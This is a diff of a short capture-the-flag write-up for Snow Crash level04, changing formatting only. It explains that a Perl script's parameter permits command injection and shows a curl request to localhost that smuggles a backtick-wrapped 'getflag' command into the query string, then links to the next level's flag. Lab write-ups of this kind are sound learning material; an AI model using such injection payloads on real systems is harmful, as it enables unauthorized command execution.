@@ -13,11 +13,9 @@ $ level04.pl
 
 In the perl file, we noticed that there is a possibility to inject a command in the param.
 
-`curl 'localhost:4747?x=\`getflag\`'`
+> curl 'localhost:4747?x=\`getflag\`'
 
-
-
-## TADAAAAAAA, (oh already.) It's ... 
+## TADAAAAAAA, It's ... 
 [The next level flag](https://github.com/XD-OB/snowcrash/blob/master/level04/flag)
 
 _tobecontinued_
